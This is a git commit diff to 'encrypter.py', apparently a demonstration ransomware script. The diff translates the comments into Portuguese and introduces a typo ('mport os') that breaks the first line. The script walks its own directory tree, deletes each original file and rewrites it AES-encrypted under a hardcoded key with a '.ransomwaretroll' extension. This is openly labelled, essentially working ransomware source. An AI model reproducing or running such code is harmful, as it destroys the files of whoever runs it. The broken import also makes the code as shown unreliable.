b83ae782b72de1a58dfff16c26fea4fdcbf068de
Julia Brito Mattos <jbmattos2003@gmail.com>
2025-01-31 02:00:08 -0300

    fix encrypter.py

--- src/encrypter.py
+++ src/encrypter.py
@@ -1,36 +1,36 @@
-import os
+mport os
 import pyaes
 
-# Get the current directory
+# Pegar diretório atual
 current_directory = os.path.dirname(os.path.abspath(__file__))
 
-# Encryption key
+# AES
 key = b"testeransomwares"
 aes = pyaes.AESModeOfOperationCTR(key)
 
-# Define filenames to exclude from encryption
+# Excluir arquivos do ransomware
 exclude_files = ["encrypter.py", "decrypter.py"]
 
-# Traverse the directory tree
+# Percorrer árvore de diretórios
 for root, dirs, files in os.walk(current_directory):
     for file_name in files:
-        # Skip the encrypter and decrypter files
+        # Pular arquivos do ransomware
         if file_name in exclude_files:
             continue
         
         file_path = os.path.join(root, file_name)
         
-        # Open the file to be encrypted
+        # Abrir arquivo a ser encriptado
         with open(file_path, "rb") as file:
             file_data = file.read()
         
-        # Remove the original file
+        # Remover arquivo original
         os.remove(file_path)
         
-        # Encrypt the file
+        # Encriptar arquivo
         crypto_data = aes.encrypt(file_data)
         
-        # Save the encrypted file
+        # Salvar arquivo encriptado
         new_file_path = file_path + ".ransomwaretroll"
         with open(new_file_path, "wb") as new_file:
             new_file.write(crypto_data)
